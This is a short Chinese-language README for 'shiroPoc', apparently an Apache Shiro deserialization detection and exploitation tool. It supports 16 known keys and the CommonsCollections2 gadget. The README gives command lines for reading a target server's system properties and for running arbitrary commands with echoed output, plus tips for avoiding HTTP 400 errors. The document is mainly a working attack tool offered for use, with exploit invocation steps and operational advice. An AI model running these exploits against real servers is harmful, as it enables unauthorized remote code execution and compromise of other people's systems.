mvn package 编译

payload来自雷石安全实验室的ShiroExploit，再次感谢雷石安全实验室，雷石安全实验室牛逼plus



## shiro-urldns 检测&利用工具
支持shiro 16个key，支持攻击利用。支持的key与gadget以及攻击类型如下
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726115923.png)


## 查看目标服务器的系统信息
该攻击类型为`XraySysProp`，使用方法如下
```
java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar 16 CommonsCollections2 XraySysProp
```

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726121111.png)

利用截图如下

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726121840.png)

## 执行命令并回显
该攻击类型为`XrayCmd` 使用方法如下
```
java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar 16 CommonsCollections2 XrayCmd
```
利用截图如下
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726122210.png)

## 注意事项
1. 建议删除不相关的http请求头，不然会因为http请求头过大而提示400错误
2.  建议使用CommonsCollections2 gadget，体积小，利用率高
